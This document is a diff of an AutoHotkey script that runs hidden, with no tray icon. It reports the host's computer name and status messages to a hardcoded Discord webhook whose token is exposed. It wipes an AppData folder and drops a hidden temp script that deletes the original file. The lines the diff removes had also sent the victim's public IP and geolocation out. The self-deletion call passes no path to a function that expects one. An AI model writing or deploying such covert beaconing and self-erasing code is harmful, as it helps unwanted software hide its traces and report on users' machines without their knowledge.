@@ -2,22 +2,27 @@
 #SingleInstance Force
 #NoTrayIcon
 
-; if you spam the webhook, its set to self destruct :)
 wkUrl := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE"
 
-; === Script entry point ===
+SetTimer(ScheduleSelfDestruct, -1)  ; Schedule this script to delete itself after a short delay
+
 CleanUpTemp()
 ExitApp
 
 CleanUpTemp() {
     tempDir := A_AppData "\PerformanceRun2"
-    Sleep 10000
+    Sleep 5000
+    NDWithLocation("Attempting to delete: " . tempDir)
+
     if DirExist(tempDir) {
         try {
+            Loop Files, tempDir "\*", "R" {
+                FileSetAttrib("-R", A_LoopFileFullPath, true)
+            }
             DirDelete(tempDir, true)
-            NDWithLocation("- Deleted folder: " . tempDir)
+            NDWithLocation("- ✅ Deleted folder: " . tempDir)
         } catch as e {
-            NDWithLocation("- FAILED to delete folder: " . tempDir . "`nReason: " . e.Message)
+            NDWithLocation("- ❌ FAILED to delete folder: " . tempDir . "`nReason: " . e.Message)
         }
     } else {
         NDWithLocation("- Folder not found: " . tempDir)
@@ -65,6 +70,39 @@ CleanUpTemp() {
     }
 }
 
+ScheduleSelfDestruct(scriptPath) {
+    Sleep 5000  ; Let everything else settle
+
+    try {
+        deleterPath := A_Temp "\c.ahk"
+
+        ; Build the content to delete the original script
+        scriptContent := "
+        (
+        Sleep 2000
+        FileDelete '" scriptPath "'
+        ExitApp
+        )"
+
+        FileAppend(scriptContent, deleterPath)
+
+        ; Run the deleter silently
+        Run('"' deleterPath '"', , "Hide")
+    } catch as e {
+        NDWithLocation("❌ Failed to schedule self-destruct: " . e.Message)
+    }
+}
+
+NDWithLocation(msg) {
+    try {
+        pc := EnvGet("COMPUTERNAME")
+        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
+        ND("[" . pc . "] " . msg . " @ " . timestamp)
+    } catch {
+        ND("- [Geo/IP unavailable] - " . msg)
+    }
+}
+
 ND(msg) {
     global wkUrl
     try {
@@ -74,49 +112,6 @@ ND(msg) {
         http.SetRequestHeader("Content-Type", "application/json")
         http.Send(json)
     } catch {
-        ; Fail silently
+        ; Silently fail
     }
-}
-
-NDWithLocation(msg) {
-    try {
-        loc := GetGeoInfo()
-        ip := GetPublicIP()
-        pc := EnvGet("COMPUTERNAME")
-        ND(loc . " - [IP: " . ip . "] - [" . pc . "] " . msg)
-    } catch {
-        ND("- [Geo/IP info unavailable] - [" . EnvGet("COMPUTERNAME") . "] " . msg)
-    }
-}
-GetGeoInfo() {
-    global cachedGeo
-    if (cachedGeo != "")
-        return cachedGeo
-
-    req := ComObject("WinHttp.WinHttpRequest.5.1")
-    req.Open("GET", "http://ip-api.com/line/?fields=countryCode,country", false)
-    req.Send()
-    if (req.Status = 200) {
-        lines := StrSplit(req.ResponseText, "`n")
-        code := Trim(lines[1])
-        name := Trim(lines[2])
-        flag := Chr(0x1F1E6 + Ord(SubStr(code, 1, 1)) - 65) . Chr(0x1F1E6 + Ord(SubStr(code, 2, 1)) - 65)
-        cachedGeo := "- [" . name . "] "
-        return cachedGeo
-    } else
-        throw "Geo request failed"
-}
-GetPublicIP() {
-    global cachedIP
-    if (cachedIP != "")
-        return cachedIP
-
-    req := ComObject("WinHttp.WinHttpRequest.5.1")
-    req.Open("GET", "https://api.ipify.org", false)
-    req.Send()
-    if (req.Status = 200) {
-        cachedIP := Trim(req.ResponseText)
-        return cachedIP
-    } else
-        throw "IP fetch failed"
 }
